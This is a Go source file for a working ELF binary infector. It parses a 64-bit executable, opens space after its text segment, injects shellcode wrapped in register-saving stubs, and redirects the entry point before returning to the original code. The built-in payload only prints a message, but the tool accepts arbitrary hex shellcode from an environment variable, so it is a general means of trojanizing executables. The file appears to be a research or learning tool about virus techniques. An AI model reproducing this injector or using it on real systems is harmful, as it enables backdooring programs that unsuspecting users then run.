package main

import (
	"bytes"
	"debug/elf"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"strings"
)

const (
	PAGE_SIZE int = 4096
)

type enumIdent struct {
	Endianness binary.ByteOrder
	Arch       elf.Class
}

type targetBin struct {
	Filesz int64
	Contents []byte
	//tName string
	Ident   []byte
	EIdent  enumIdent
	Hdr     interface{}
	Shdrs   interface{}
	Phdrs   interface{}
	Fh      *os.File
	Payload bytes.Buffer
}

var preserve64 = []byte {
	0x50,              //push   %rax
	0x53,              //push   %rbx
	0x52,              //push   %rdx
	0x56,              //push   %rsi
	0x57,              //push   %rdi
	0x55,              //push   %rbp
	0x54,              //push   %rsp
	0x41, 0x50,        //push   %r8
	0x41, 0x51,        //push   %r9
	0x41, 0x52,        //push   %r10
	0x41, 0x53,        //push   %r11
	0x41, 0x54,        //push   %r12
	0x41, 0x55,        //push   %r13
	0x41, 0x56,        //push   %r14
	0x41, 0x57,        //push   %r15
}

var restoration64 = []byte {
	0x41, 0x5f,        //pop    %r15
	0x41, 0x5e,        //pop    %r14
	0x41, 0x5d,        //pop    %r13
	0x41, 0x5c,        //pop    %r12
	0x41, 0x5b,        //pop    %r11
	0x41, 0x5a,        //pop    %r10
	0x41, 0x59,        //pop    %r9
	0x41, 0x58,        //pop    %r8
	0x5c, 	           //pop    %rsp
	0x5d, 	           //pop    %rbp
	0x5f,              //pop    %rdi
	0x5e,              //pop    %rsi
	0x5a,              //pop    %rdx
	0x5b,              //pop    %rbx
	0x58,              //pop    %rax
}

var defaultPayload64 = []byte{
	0xeb, 0x00, //jmp    401005 <message>
	//0000000000401005 <message>:
	0xe8, 0x2b, 0x00, 0x00, 0x00, //call   401035 <shellcode>
	0x68, 0x65, 0x6c, 0x6c, 0x6f, //push   $0x6f6c6c65
	0x20, 0x2d, 0x2d, 0x20, 0x74, 0x68, //and    %ch,0x6874202d(%rip)        # 68b43042 <__bss_start+0x68741042>
	0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, //imul   $0x61207369,0x20(%rbx),%esi
	0x20, 0x6e, 0x6f, //and    %ch,0x6f(%rsi)
	0x6e,                   //outsb  %ds:(%rsi),(%dx)
	0x20, 0x64, 0x65, 0x73, //and    %ah,0x73(%rbp,%riz,2)
	0x74, 0x72, //je     401098 <get_eip+0x37>
	0x75, 0x63, //jne    40108b <get_eip+0x2a>
	0x74, 0x69, //je     401093 <get_eip+0x32>
	0x76, 0x65, //jbe    401091 <get_eip+0x30>
	0x20, 0x70, 0x61, //and    %dh,0x61(%rax)
	0x79, 0x6c, //jns    40109d <get_eip+0x3c>
	0x6f,       //outsl  %ds:(%rsi),(%dx)
	0x61,       //(bad)
	0x64, 0x0a, //or     %fs:0x1(%rax),%bh

	//0000000000401035 <shellcode>:
	0xb8, 0x01, 0x00, 0x00, 0x00, //mov    $0x1,%eax
	0xbf, 0x01, 0x00, 0x00, 0x00, //mov    $0x1,%edi
	0x5e,                         //pop    %rsi
	0xba, 0x2a, 0x00, 0x00, 0x00, //mov    $0x2a,%edx
	0x0f, 0x05, //syscall
}

var defaultPayload32 = []byte{
	0xeb, 0x00,	                				//jmp    8049002 <message>
	//08049002 <message>:
	0xe8, 0x2b, 0x00, 0x00, 0x00,       		//call   8049032 <shellcode>
	0x68, 0x65, 0x6c, 0x6c, 0x6f,       		//push   $0x6f6c6c65
	0x20, 0x2d, 0x2d, 0x20, 0x74, 68,    		//and    %ch,0x6874202d
	0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 	//imul   $0x61207369,0x20(%ebx),%esi
	0x20, 0x6e, 0x6f,             				//and    %ch,0x6f(%esi)
	0x6e,                   					//outsb  %ds:(%esi),(%dx)
	0x2d, 0x64, 0x65, 0x73, 0x74,       		//sub    $0x74736564,%eax
	0x72, 0x75,                					//jb     8049099 <shellcode+0x67>
	0x63, 0x74, 0x69, 0x76,          			//arpl   %si,0x76(%ecx,%ebp,2)
	0x65, 0x20, 0x70, 0x61,          			//and    %dh,%gs:0x61(%eax)
	0x79, 0x6c,                					//jns    804909a <shellcode+0x68>
	0x6f,                   					//outsl  %ds:(%esi),(%dx)
	0x61,                   					//popa   
	0x64,                   					//fs
	0x0a,                   					//.byte 0xa
	//08049032 <shellcode>:								
 	0x59,                   					//pop    %ecx
 	0xbb, 0x01, 0x00, 0x00, 0x00,       		//mov    $0x1,%ebx
 	0xba, 0x2a, 0x00, 0x00, 0x00,       		//mov    $0x2a,%edx
 	0xb8, 0x04, 0x00, 0x00, 0x00,       		//mov    $0x4,%eax
 	0xcd, 0x80,                					//int    $0x80
}

func getPayloadFromEnv(p io.Writer, key string) (int, error) {
	val, ok := os.LookupEnv(key)
	if !ok {
		errorString := "Environmental variable " + key + " is not set"
		return 0, errors.New(errorString)
	}

	if val == "" {
		errorString := "Environmental variable " + key + " contains no payload"
		return 0, errors.New(errorString)
	}
	val = strings.ReplaceAll(val, "\\x", "")
	decoded, err := hex.DecodeString(val)
	if err != nil {
		log.Fatal(err)
	}

	return p.Write(decoded)
}

func (t *targetBin) isElf() bool {
	t.Ident = t.Contents[:16]
	return !(t.Ident[0] != '\x7f' || t.Ident[1] != 'E' || t.Ident[2] != 'L' || t.Ident[3] != 'F')
}

func checkError(e error) {
	if e != nil {
		panic(e)
	}
}

func (t *targetBin) infectBinary(debug bool) error {
	var textSegStart64 uint64
	var textSegEnd64 uint64

	var oEntry64 uint64
	var oShoff64 uint64

	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		oEntry64 = t.Hdr.(*elf.Header64).Entry
		oShoff64 = t.Hdr.(*elf.Header64).Shoff

		t.Hdr.(*elf.Header64).Shoff += uint64(PAGE_SIZE)

		var textNdx int
		var retStub []byte
		pHeaders := t.Phdrs.([]elf.Prog64)
		pNum := int(t.Hdr.(*elf.Header64).Phnum)
		for i := 0; i < pNum; i++ {
			if elf.ProgType(pHeaders[i].Type) == elf.PT_LOAD && (elf.ProgFlag(pHeaders[i].Flags) == (elf.PF_X | elf.PF_R)) {
				textNdx = i
				t.Hdr.(*elf.Header64).Entry = pHeaders[i].Vaddr + pHeaders[i].Filesz
				textSegStart64 = pHeaders[i].Off
				if debug {
					fmt.Printf("[+] Modified entry point from 0x%x -> 0x%x\n", oEntry64, t.Hdr.(*elf.Header64).Entry)
				}

				textSegEnd64 = pHeaders[i].Off + pHeaders[i].Filesz
				if debug {
					fmt.Printf("[+] Text segment starts @ 0x%x\n", textSegStart64)
					fmt.Printf("[+] Text segment ends @ 0x%x\n", textSegEnd64)
					fmt.Printf("[+] Payload size pre-epilogue 0x%x\n", t.Payload.Len())
				}

				t.Payload.Write(restoration64)
				retStub = modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header64).Entry, oEntry64)
				t.Payload.Write(retStub)
				
				if debug {
					fmt.Printf("[+] Payload size post-epilogue 0x%x\n", t.Payload.Len())

					fmt.Println("------------------PAYLOAD----------------------------")
					fmt.Printf("%s", hex.Dump(t.Payload.Bytes()))
					fmt.Println("--------------------END------------------------------")
				}

				t.Phdrs.([]elf.Prog64)[i].Memsz += uint64(t.Payload.Len())
				t.Phdrs.([]elf.Prog64)[i].Filesz += uint64(t.Payload.Len())

				if debug {
					fmt.Println("[+] Generated and appended position independent return 2 OEP stub to payload")
					fmt.Printf("[+] Increased text segment p_filesz and p_memsz by %d (length of payload)\n", t.Payload.Len())
				}
			}
		}

		if debug {
			fmt.Println("[+] Adjusting segments after text segment file offsets by ", PAGE_SIZE)
		}

		for j := textNdx; j < pNum; j++ {
			if pHeaders[textNdx].Off < pHeaders[j].Off {
				if debug {
					fmt.Println("Inceasing pHeader @ index ", j, PAGE_SIZE)
				}
				t.Phdrs.([]elf.Prog64)[j].Off += uint64(PAGE_SIZE)
			}
		}

		if debug {
			fmt.Println("[+] Increasing section header addresses if they come after text segment")
		}
		sectionHdrTable := t.Shdrs.([]elf.Section64)
		sNum := int(t.Hdr.(*elf.Header64).Shnum)

		for k := 0; k < sNum; k++ {
			if sectionHdrTable[k].Off >= textSegEnd64 {
				if debug {
					fmt.Printf("[+] (%d) Updating sections past text segment @ addr 0x%x\n", k, sectionHdrTable[k].Addr)
				}
				t.Shdrs.([]elf.Section64)[k].Off += uint64(PAGE_SIZE)
			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header64).Entry {
				if debug {
					fmt.Println("[+] Extending section header entry for text section by payload len.")
				}
				t.Shdrs.([]elf.Section64)[k].Size += uint64(t.Payload.Len())
			}
		}

	case elf.ELFCLASS32:
		return errors.New("Infection for 32-bit not supported yet")
	}

	infected := new(bytes.Buffer)

	if h, ok := t.Hdr.(*elf.Header64); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, h); err != nil {
			return err
		}
	}

	if h, ok := t.Hdr.(*elf.Header32); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, h); err != nil {
			return err
		}
	}

	if p, ok := t.Phdrs.([]elf.Prog64); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, p); err != nil {
			return err
		}
	}

	if p, ok := t.Phdrs.([]elf.Prog32); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, p); err != nil {
			return err
		}
	}

	var ephdrsz int
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		ephdrsz = int(t.Hdr.(*elf.Header64).Ehsize) + int(t.Hdr.(*elf.Header64).Phentsize * t.Hdr.(*elf.Header64).Phnum)
	case elf.ELFCLASS32:
		ephdrsz = int(t.Hdr.(*elf.Header32).Ehsize) + int(t.Hdr.(*elf.Header32).Phentsize * t.Hdr.(*elf.Header32).Phnum)
	}

	infected.Write(t.Contents[ephdrsz:])

	infectedShdrTable := new(bytes.Buffer)
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:	
		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section64))
	case elf.ELFCLASS32:
		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section32))
	}


	finalInfectionTwo := make([]byte, infected.Len() + int(PAGE_SIZE))
	finalInfection := infected.Bytes()

	copy(finalInfection[int(oShoff64):], infectedShdrTable.Bytes())

	endOfInfection := int(textSegEnd64)

	copy(finalInfectionTwo, finalInfection[:endOfInfection])

	if debug {
		fmt.Println("[+] writing payload into the binary")
	}
	
	copy(finalInfectionTwo[endOfInfection:], t.Payload.Bytes())
	copy(finalInfectionTwo[endOfInfection + PAGE_SIZE:], finalInfection[endOfInfection:])
	infectedFileName := fmt.Sprintf("%s-infected", t.Fh.Name())

	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err !=nil {
		return err
	}
	return nil
}

func (t *targetBin) enumIdent() error {
	switch elf.Class(t.Ident[elf.EI_CLASS]) {
	case elf.ELFCLASS64:
		t.Hdr = new(elf.Header64)
		t.EIdent.Arch = elf.ELFCLASS64
	case elf.ELFCLASS32:
		t.Hdr = new(elf.Header32)
		t.EIdent.Arch = elf.ELFCLASS32
	default:
		return errors.New("Invalid Arch supplied -- only x86 and x64 ELF binaries supported")
	}

	switch elf.Data(t.Ident[elf.EI_DATA]) {
	case elf.ELFDATA2LSB:
		t.EIdent.Endianness = binary.LittleEndian
	case elf.ELFDATA2MSB:
		t.EIdent.Endianness = binary.BigEndian
	default:
		return errors.New("Binary possibly corrupted -- byte order unknown")
	}

	return nil
}

func (t *targetBin) mapHeader() error {
	h := bytes.NewReader(t.Contents)
	b := t.EIdent.Endianness

	switch a := t.EIdent.Arch; a {
	case elf.ELFCLASS64:
		t.Hdr = new(elf.Header64)
		if err := binary.Read(h, b, t.Hdr); err != nil {
			return err
		}
	case elf.ELFCLASS32:
		t.Hdr = new(elf.Header32)
		if err := binary.Read(h, b, t.Hdr); err != nil {
			return err
		}
	}
	return nil
}

func (t *targetBin) getSectionHeaders() error {
	if h, ok := t.Hdr.(*elf.Header64); ok {
		start := int(h.Shoff)
		end := int(h.Shentsize)*int(h.Shnum) + int(h.Shoff)
		sr := bytes.NewBuffer(t.Contents[start:end])
		t.Shdrs = make([]elf.Section64, h.Shnum)

		if err := binary.Read(sr, t.EIdent.Endianness, t.Shdrs.([]elf.Section64)); err != nil {
			return err
		}
	}

	if h, ok := t.Hdr.(*elf.Header32); ok {
		start := int(h.Shoff)
		end := int(h.Shentsize)*int(h.Shnum) + int(h.Shoff)
		sr := bytes.NewBuffer(t.Contents[start:end])
		t.Shdrs = make([]elf.Section32, h.Shnum)

		if err := binary.Read(sr, t.EIdent.Endianness, t.Shdrs.([]elf.Section32)); err != nil {
			return err
		}
	}

	return nil
}

func (t *targetBin) getProgramHeaders() error {
	if h, ok := t.Hdr.(*elf.Header64); ok {
		start := h.Phoff
		end := int(h.Phentsize)*int(h.Phnum) + int(h.Phoff)
		pr := bytes.NewBuffer(t.Contents[start:end])
		t.Phdrs = make([]elf.Prog64, h.Phnum)

		if err := binary.Read(pr, t.EIdent.Endianness, t.Phdrs.([]elf.Prog64)); err != nil {
			return err
		}
	}

	if h, ok := t.Hdr.(*elf.Header32); ok {
		start := h.Phoff
		end := int(h.Phentsize)*int(h.Phnum) + int(h.Phoff)
		pr := bytes.NewBuffer(t.Contents[start:end])
		t.Phdrs = make([]elf.Prog32, h.Phnum)

		if err := binary.Read(pr, t.EIdent.Endianness, t.Phdrs.([]elf.Prog32)); err != nil {
			return err
		}
	}

	return nil
}

func (t *targetBin) getFileContents() error {
	fStat, err := t.Fh.Stat()
	if err != nil {
		return err
	}

	t.Filesz = fStat.Size()
	t.Contents = make([]byte, t.Filesz)

	if _, err := t.Fh.Read(t.Contents); err != nil {
		return err
	}
	return nil
}

func main() {

	debug := flag.Bool("debug", false, "see debug out put (generated payload, modifications, etc)")
	pEnv := flag.String("payloadEnv", "", "name of the environmental variable holding the payload")
	oFile := flag.String("target", "", "path to binary targetted for infection")
	pFile := flag.String("payloadBin", "", "path to binary containing payload")
	flag.Parse()

	if *oFile == "" {
		flag.PrintDefaults()
		log.Fatal("No target binary supplied")
	}
	t := new(targetBin)

	fh, err := os.Open(*oFile)
	if err != nil {
		log.Fatal(err)
	}

	t.Fh = fh
	defer t.Fh.Close()

	if err := t.getFileContents(); err != nil {
		fmt.Println(err)
		return
	}

	if !t.isElf() {
		fmt.Println("This is not an Elf binary")
		return
	}

	if err := t.enumIdent(); err != nil {
		fmt.Println(err)
		return
	}
	

	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		t.Payload.Write(preserve64)
	case elf.ELFCLASS32:
		fmt.Println("32-bit not supported yet")
		return
	}

	switch {

	case *pEnv != "" && *pFile != "":
		flag.PrintDefaults()
		return

	case *pEnv == "" && *pFile == "":
		if t.EIdent.Arch == elf.ELFCLASS64 {
			t.Payload.Write(defaultPayload64)
		} else {
			fmt.Println("No support for 32-bit payloads yet.")
			return
		}

	case *pEnv != "":
		if _, err := getPayloadFromEnv(&t.Payload, *pEnv); err != nil {
			fmt.Println(err)
			return
		}

	case *pFile != "":
		fmt.Println("Getting payload from an ELF binary .text segment is not yet supported")
		return
	}

	if err := t.mapHeader(); err != nil {
		fmt.Println(err)
		return
	}

	if err := t.getSectionHeaders(); err != nil {
		fmt.Println(err)
		return
	}

	if err := t.getProgramHeaders(); err != nil {
		fmt.Println(err)
		return
	}

	if err := t.infectBinary(*debug); err != nil {
		fmt.Println(err)
		return
	}
}
